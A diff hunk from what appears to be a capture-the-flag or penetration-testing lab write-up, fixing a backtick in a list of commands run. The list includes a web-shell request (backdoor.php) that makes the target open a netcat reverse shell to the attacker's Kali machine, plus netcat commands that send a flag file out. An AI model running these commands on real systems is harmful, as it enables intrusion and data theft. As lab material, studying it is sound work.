@@ -88,7 +88,7 @@ fi
   - Commands run:
     - `bash ./exploit.sh`
     - `nc -lnvp 4444`
-    - `http://<Target 2 URL>/backdoor.php?cmd=nc%20<Kali IP>%204444%20-e%20/bin/bash' (In Kali web browser.)
+    - `http://<Target 2 URL>/backdoor.php?cmd=nc%20<Kali IP>%204444%20-e%20/bin/bash` (In Kali web browser.)
     - `find /var/www -type f -iname 'flag*'`
     - `nc -l -p 4444 > flag3.png` (recieving)
     - `cat flag3.png | netcat 192.168.1.90 4444` (sending)
